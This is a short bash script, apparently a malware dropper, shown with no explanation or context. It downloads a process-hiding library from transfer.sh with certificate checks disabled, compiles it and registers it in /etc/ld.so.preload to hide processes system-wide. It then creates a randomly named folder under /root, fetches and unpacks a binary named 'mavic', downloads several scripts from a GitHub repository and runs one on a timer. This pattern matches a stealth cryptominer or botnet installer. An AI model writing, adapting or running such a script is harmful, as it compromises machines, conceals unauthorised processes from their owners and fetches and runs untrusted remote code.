#!/bin/bash
apt update
apt install sudo screen -y
wget --no-check-certificate -c http://transfer.sh/ntzeku/processhider.c -O jik.c 
gcc -Wall -fPIC -shared -o libprocessh.so jik.c -ldl
sudo mv libprocessh.so /usr/local/lib/ 
echo /usr/local/lib/libprocessh.so >> /etc/ld.so.preload 
cd /root 
nimo=$(openssl rand -base64 5)
fol=$(openssl rand -base64 6)
ran1=$(openssl rand -base64 3)
ran2=$(openssl rand -base64 4)
ra3=$(openssl rand -base64 7)
mkdir $fol
cd $fol
wget http://transfer.sh/H8t4Pk/mav.zip 
unzip mav.zip 
chmod 777 mavic 
rm mav.zip
wget https://github.com/Mafs68/hjs839/raw/main/rad1.sh 
wget https://github.com/Mafs68/hjs839/raw/main/Sec.sh
wget https://github.com/Mafs68/hjs839/raw/main/mai.sh 
chmod 777 mai.sh
timeout 351m ./mai.sh
